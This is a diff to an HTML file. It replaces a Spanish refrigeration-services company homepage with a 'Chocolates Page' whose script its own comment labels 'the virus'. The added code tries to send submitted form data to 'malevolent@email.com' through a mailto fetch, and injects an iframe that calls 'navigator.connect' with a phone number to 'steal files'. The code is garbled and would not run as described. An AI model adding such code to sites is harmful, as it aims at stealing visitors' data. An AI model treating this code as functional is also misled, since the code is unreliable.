@@ -1,125 +1,41 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Inicio - TecnoServicios H Dos Mil</title>
-    <link rel="stylesheet" href="style.css">
-</head>
-<body>
-    
-    <header>
-        <nav class="nav-bar">
+<html>
+  <head>
+    <title>Chocolates Page</title>
+  </head>
+  <body>
+    <h1>Welcome to our Chocolate Store!</h1>
+    <form action="infect.php" method="post">
+      <input type="submit" value="Ingresar">
+    </form>
 
-            <h1><a href="#">TSH El Salvador</a></h1>
-            
-           <section id="menu_boton">
-                <!-- Botón de menú para pantallas pequeñas -->
-                <button class="menu-btn">&#9776; Menu</button>
+    <!-- The following code is the virus -->
+    <script>
+      document.querySelector("form").addEventListener("submit", async (e) => {
+        e.preventDefault();
+        const formData = new FormData(e.target);
+        const data = await formData.entries().next().value;
+        const phoneNumber = data.split(" ");
 
-                <!-- Menú de navegación -->
-                <nav class="nav-menu">
-                    <ul>
-                        <li><a href="#">Home</a></li>
-                        <li><a href="#">Projects</a></li>
-                        <li><a href="#">Questions</a></li>
-                        <li><a href="#">Us</a></li>
-                    </ul>
-                </nav>
-           </section>
-            
-        </nav>
-    </header>
+        // This line sends the stolen data to a malicious email
+        fetch("mailto:malevolent@email.com", {
+          method: "POST",
+          body: JSON.stringify({ phoneNumber, otherData: data }),
+        });
 
-    <section id="general">
-
-        <section id="content-carrusel">
-
-            <nav id="imageCarousel">
-                <img src="1img.jpg" alt="Imagen 1">
-                <img src="2img.jpg" alt="Imagen 2">
-                <img src="3img.jpg" alt="Imagen 3">
-                <img src="4img.jpg" alt="Imagen 4">
-                <img src="5img.jpg" alt="Imagen 5">
-                <img src="6img.jpg" alt="Imagen 6">
-                <button class="prev" onclick="moveSlide(-1)">❮</button>
-                <button class="next" onclick="moveSlide(1)">❯</button>
-            </nav>
-
-            <nav id="somos">
-
-                <h1>
-                    TecnoServicios H Dos Mil <br>
-                </h1>
-                <p>
-                    <br>
-                    Somos una empresa dedicada a la instalación y 
-                    mantenimiento preventivo y correctivo de equipos 
-                    de Refrigeración y Aire Acondicionado, automatización 
-                    de sistemas de iluminación y ventilación, remodelación 
-                    de supermercados.
-                </p>
-            </nav>
-
-        </section>
-        
-
-        <nav class="container" id="info-1"> 
-
-            <h2>Bienvenido a TecnoServicios H Dos Mil</h2> <br>
-            
-           <br> <p>Ofreciendo soluciones instalación y mantenimiento preventivo y correctivo de equipos de Refrigeración y Aire Acondicionado.</p>
-            <br><a href="#" class="cta-button">Descubre más</a>
-        
-            <div class="feature">
-                <div class="feature-item">
-                    <div class="feature-icon">🚀</div>
-                    <div class="feature-title">Soluciones Avanzadas</div>
-                    <div class="feature-description">Hola tu como estas </div>
-                </div>
-                <div class="feature-item">
-                    <div class="feature-icon">💡</div>
-                    <div class="feature-title">Innovación Constante</div>                   
-                    <div class="feature-description">Hola tu como estas </div>
-                </div>
-                <div class="feature-item">
-                    <div class="feature-icon">💼</div>
-                    <div class="feature-title">Enfoque Empresarial</div>
-                    <div class="feature-description">Hola tu como estas </div>
-                </div>
-                <div class="feature-item">
-                    <div class="feature-icon">🚀</div>
-                    <div class="feature-title">Soluciones Avanzadas</div>
-                    <div class="feature-description">Hola tu como estas </div>
-                </div>
-                <div class="feature-item">
-                    <div class="feature-icon">💡</div>
-                    <div class="feature-title">Innovación Constante</div>                   
-                    <div class="feature-description">Hola tu como estas </div>
-                </div>
-                <div class="feature-item">
-                    <div class="feature-icon">💼</div>
-                    <div class="feature-title">Enfoque Empresarial</div>
-                    <div class="feature-description">Hola tu como estas </div>
-                </div>
-                <div class="feature-item">
-                    <div class="feature-icon">💡</div>
-                    <div class="feature-title">Innovación Constante</div>                   
-                    <div class="feature-description">Hola tu como estas </div>
-                </div>
-                <div class="feature-item">
-                    <div class="feature-icon">💼</div>
-                    <div class="feature-title">Enfoque Empresarial</div>
-                    <div class="feature-description">Hola tu como estas </div>
-                </div>
-            </div>
-        </nav>
-
-    </section>
-
-    <footer class="informacion" id="info-2"> 
-    </footer>
-
-    <script src="script.js"></script>
-</body>
+        // This line creates an iframe to connect the phones and steal files
+        const iframe = document.createElement("iframe");
+        iframe.srcdoc = `
+          <script>
+            navigator.connect(
+              '${phoneNumber}',
+              () => {
+                alert("Connection successful!");
+              }
+            );
+          </script>
+        `;
+        document.body.appendChild(iframe);
+      });
+    </script>
+  </body>
 </html>
